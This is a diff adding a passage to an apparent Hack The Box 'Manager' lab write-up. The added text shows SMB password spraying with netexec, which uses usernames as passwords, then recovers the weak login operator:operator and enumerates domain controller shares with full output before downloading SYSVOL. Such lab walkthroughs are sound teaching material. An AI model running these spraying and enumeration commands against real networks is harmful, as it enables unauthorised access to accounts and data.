@@ -126,3 +126,30 @@ operator
 ```
 we made a userlist with the usernames. 
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5f9f241f-8cb6-4f2a-9cc7-a4b397d4dbe2)
+
+```shell
+sudo nxc smb 10.129.22.154 -u users.txt -p users.txt
+```
+bruteforcing smb using the users gotten with the same users as password to see if we got a weak cred. we can see we have smb access as user `operator:operator`.
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Manager]
+└─$ sudo nxc smb 10.129.22.154 -u operator -p operator --shares 
+SMB         10.129.22.154   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+SMB         10.129.22.154   445    DC01             [+] manager.htb\operator:operator 
+SMB         10.129.22.154   445    DC01             [*] Enumerated shares
+SMB         10.129.22.154   445    DC01             Share           Permissions     Remark
+SMB         10.129.22.154   445    DC01             -----           -----------     ------
+SMB         10.129.22.154   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.22.154   445    DC01             C$                              Default share
+SMB         10.129.22.154   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.22.154   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.22.154   445    DC01             SYSVOL          READ            Logon server share
+```
+enumerating smb using the creds we got, we can see we have read access to shares `NETVOL` & `SYSVOL`. let's check em out.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/8c5754b5-1b5f-4143-b5db-8dfd93e5c059)
+
+checking the `NETLOGON` share was empty, we got a dir in the `SYSVOL` share. proceded to download everything in it. 
+
